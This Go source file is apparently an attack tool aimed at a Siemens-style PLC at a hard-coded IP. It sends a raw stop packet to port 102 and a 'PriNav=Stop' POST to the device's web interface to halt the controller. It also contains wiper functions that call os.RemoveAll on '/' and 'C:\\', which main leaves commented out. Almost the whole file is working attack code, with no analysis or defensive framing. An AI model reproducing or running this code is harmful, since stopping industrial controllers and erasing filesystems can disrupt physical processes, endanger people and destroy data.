package main

import (
	"fmt"
	"net"
	"os"
	"net/http"
	"strings"  // Re-added the strings package
	"runtime"
)

func KillIP(targetIP string) {
	// Connect to device port 102
	stop := "\x03\x00\x00\x21\x02\xf0\x80\x32\x01\x00\x00\x06\x00\x00\x10\x00\x00\x29\x00\x00\x00\x00\x00\x09\x50\x5f\x50\x52\x4f\x47\x52\x41\x4d"
	target := targetIP + ":102"
	fmt.Printf("Sending stop command to IP: %s\n", target)
	conn, err := net.Dial("tcp", target)
	if err != nil {
		fmt.Printf("Failed to connect to %s: %v\n", target, err)
		return
	} else {
		_, err = conn.Write([]byte(stop))
		if err != nil {
			fmt.Printf("Failed to send stop command to %s: %v\n", target, err)
		} else {
			fmt.Printf("Stop command sent to %s\n", target)
		}
	}
	conn.Close()
}

func KillHTTP(targetIP string) {
	// Send stop via web interface
	client := &http.Client{}
	var data = strings.NewReader(`Run=1&PriNav=Stop`)
	url := "http://" + targetIP + "/CPUCommands"
	fmt.Printf("Sending HTTP stop command to URL: %s\n", url)
	req, err := http.NewRequest("POST", url, data)
	if err != nil {
		fmt.Printf("Failed to create HTTP request for %s: %v\n", targetIP, err)
		return
	}
	req.Header.Set("Host", targetIP)
	req.Header.Set("Content-Length", "19")
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Origin", "http://"+targetIP)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0. (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36")
	req.Header.Set("Accept", "text/html, application/xhtml+xml, application/xml; q=0.9,image/avif, image/webp, image/apng,*/*; q=0.8, application/signed-exchange; v=b3; q=0.9")
	req.Header.Set("Referer", "http://"+targetIP+"/Portal/Portal.mwsl?PriNav=Start")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US, en; q=0.9")
	req.Header.Set("Connection", "close")
	req.Header.Set("Cookie", "siemens_automation_no_intro=TRUE")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Failed to send HTTP request to %s: %v\n", targetIP, err)
	} else {
		fmt.Printf("HTTP stop command sent to %s\n", targetIP)
	}
	if resp != nil {
		resp.Body.Close()
	}
}

func KillLinux() {
	// If UID != 0, program deletes files owned by current user
	fmt.Println("Attempting to delete all files on Linux system")
	err := os.RemoveAll("/")
	if err != nil {
		fmt.Println("Failed to delete files on Linux system:", err)
		return
	}
	fmt.Println("Files deleted on Linux system")
}

func KillWindows() {
	// If current user does not have administrative privileges, removes files owned by current user
	fmt.Println("Attempting to delete all files on Windows system")
	err := os.RemoveAll("C:\\")
	if err != nil {
		fmt.Println("Failed to delete files on Windows system:", err)
		return
	}
	fmt.Println("Files deleted on Windows system")
}

func main() {
	targetIP := "172.16.18.154"
	fmt.Println("Targeting PLC at IP:", targetIP)

	// PLC STOP to target
	KillIP(targetIP)
	KillHTTP(targetIP)

	// Wipe filesystems
	op_sys := runtime.GOOS
	//if op_sys == "linux" {
	//	KillLinux()
	//}
	//if op_sys == "windows" {
	//	KillWindows()
	//}
}
